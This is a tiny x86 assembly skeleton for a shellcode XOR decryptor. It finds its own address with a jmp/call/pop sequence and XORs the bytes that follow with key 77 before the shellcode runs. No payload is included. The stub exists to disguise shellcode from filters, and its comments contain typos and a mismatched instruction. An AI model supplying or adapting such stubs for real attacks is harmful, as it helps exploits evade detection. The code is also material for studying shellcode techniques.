# skelletton for byte-size decryptor

.text
.align 4
.globl main
.type main,@function

main:		jmp .nonzero
.getip:		popl %esi
		jmp .next
.nonzero:	call .getip
.next:		addl $10, %esi		# may be pacthed later
		xorl %ecx, %ecx
		movb $11, %ecx		# actual shellcode-length
.loop1:		xorb $77, (%esi)
		incl %esi
		loop .loop1
				        # shellcode goes here
